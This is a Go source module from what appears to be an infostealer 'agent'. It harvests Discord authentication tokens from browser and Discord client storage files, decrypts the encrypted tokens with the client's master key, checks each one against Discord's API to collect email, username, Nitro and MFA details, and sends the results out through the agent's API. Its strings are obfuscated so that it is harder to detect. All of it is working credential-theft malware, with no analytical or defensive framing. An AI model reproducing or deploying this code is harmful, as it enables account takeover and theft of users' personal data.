package modules

import (
	"agent/api"
	"agent/lib"
	"agent/vars"
	"encoding/base64"
	"encoding/json"
	"errors"
	"io"
	"net/http"
	"os"
	"path"
	"regexp"
	"strings"
	"sync"
)

func checkToken(t string) (vars.TDiscord, error) {
	var ret vars.TDiscord

	req, err := http.NewRequest(lib.Decode(vars.Req_GET),
		lib.Decode(vars.Req_discord), nil)
	if err != nil {
		return ret, errors.New(lib.Decode(vars.Msg_Reqmkfail))
	}

	req.Header.Set(lib.Decode(vars.Headers_usr), lib.GetAgent())
	req.Header.Set(lib.Decode(vars.Headers_auth), t)

	res, err := http.DefaultClient.Do(req)
	if err != nil {
		return ret, err
	}
	defer res.Body.Close()

	if res.StatusCode != 200 {
		return ret, errors.New(lib.Decode(vars.Msg_Badrescode))
	}

	data, err := io.ReadAll(res.Body)
	if err != nil {
		return ret, err
	}
	var body map[string]interface{}

	err = json.Unmarshal(data, &body)
	if err != nil {
		return ret, err
	}

	ret.Token = t
	ret.Email = body[lib.Decode(vars.Discord_email)].(string)
	ret.User = body[lib.Decode(vars.Discord_user)].(string)
	switch body[lib.Decode(vars.Discord_nitro)].(float64) {
	case 1:
		ret.Nitro = lib.Decode(vars.Discord_nitro1)
	case 2:
		ret.Nitro = lib.Decode(vars.Discord_nitro2)
	case 3:
		ret.Nitro = lib.Decode(vars.Discord_nitro3)
	default:
		ret.Nitro = lib.Decode(vars.Discord_nonitro)
	}
	ret.MFA = body[lib.Decode(vars.Discord_mfa)].(bool)
	ret.ID = body[lib.Decode(vars.Discord_id)].(string)

	return ret, nil
}

func checkTokens(tokens []string) []vars.TDiscord {
	var accs []vars.TDiscord

	for _, t := range tokens {
		skip := false
		for _, a := range accs {
			if a.Token == t {
				skip = true
			}
		}

		if skip {
			continue
		}

		acc, err := checkToken(t)
		if err != nil {
			continue
		}

		accs = append(accs, acc)
	}

	return accs
}

func readDiscordBrowser(p string, bp string) []vars.TDiscord {
	var res []vars.TDiscord
	var tokens []string

	data, err := os.ReadFile(p)
	if err != nil {
		return res
	}

	re1, err := regexp.Compile(
		lib.Decode(vars.Discord_tokenreg1))
	if err != nil {
		return res
	}

	re2, err := regexp.Compile(
		lib.Decode(vars.Discord_tokenreg2))
	if err != nil {
		return res
	}

	lines := strings.Split(string(data), "\n")
	for _, l := range lines {
		matches := re1.FindAllString(l, -1)
		matches = append(matches, re2.FindAllString(l, -1)...)
		tokens = append(tokens, matches...)
	}

	res = append(res, checkTokens(tokens)...)
	return res
}

func readDiscord(p string, bp string) []vars.TDiscord {
	var res []vars.TDiscord
	var tokens []string

	state := path.Join(bp, lib.Decode(vars.Path_localst))
	master, err := lib.GetMaster(state)
	if err != nil {
		return res
	}

	data, err := os.ReadFile(p)
	if err != nil {
		return res
	}

	re, err := regexp.Compile(lib.Decode(vars.Discord_regex))
	if err != nil {
		return res
	}

	lines := strings.Split(string(data), "\n")
	for _, l := range lines {
		matches := re.FindAllString(l, -1)
		for _, m := range matches {
			encl := strings.Split(m, lib.Decode(vars.Discord_split))
			if len(encl) < 2 {
				continue
			}

			dec, err := base64.StdEncoding.DecodeString(encl[1])
			if err != nil {
				continue
			}

			pl, err := lib.DecryptPass(string(dec), master)
			if err != nil {
				continue
			}

			tokens = append(tokens, pl)
		}
	}

	res = append(res, checkTokens(tokens)...)
	return res
}

func dumpDiscord(b vars.Browser) ([]vars.TDiscord, error) {
	var res []vars.TDiscord
	dec := lib.Decode(b.Path)

	if dec == "" {
		return res, errors.New(lib.Decode(vars.Msg_BadEnc))
	}

	fp := path.Join(os.Getenv(lib.Decode(b.Prefix)), dec)
	ldbs := lib.FindFiles(fp, "log", true)
	ldbs = append(ldbs, lib.FindFiles(fp, "ldb", true)...)

	for _, l := range ldbs {
		if lib.Decode(b.Type) == "Discord" {
			res = append(res, readDiscord(l, fp)...)
		} else {
			res = append(res, readDiscordBrowser(l, fp)...)
		}
	}

	for i := range res {
		res[i].From = lib.Decode(b.Name)
	}

	return res, nil
}

func GetDiscord(wg *sync.WaitGroup) {
	for _, b := range vars.Browsers {
		cs, err := dumpDiscord(b)
		if err != nil {
			lib.Print(vars.Msg_DumpError,
				lib.Decode(vars.Module_discord), err.Error())
		}
		vars.Agent.Discord = append(vars.Agent.Discord, cs...)
	}

	clean := []vars.TDiscord{}
	for _, d := range vars.Agent.Discord {
		skip := false
		for _, c := range clean {
			if c.Token == d.Token {
				skip = true
			}
		}

		if skip {
			continue
		}

		clean = append(clean, d)
	}

	vars.Agent.Discord = clean
	lib.Print(vars.Msg_Entries,
		lib.Decode(vars.Module_discord), len(vars.Agent.Discord))

	err := api.SendJSON(lib.Decode(vars.Module_discord), struct {
		Discord []vars.TDiscord `json:"ST_MAP$json.discord_data$"`
	}{
		Discord: vars.Agent.Discord,
	})

	if err != nil {
		lib.Print(vars.Msg_FailSend,
			lib.Decode(vars.Module_discord), err.Error())
	}

	lib.Print(vars.Msg_Done, lib.Decode(vars.Module_discord))
	wg.Done()
}
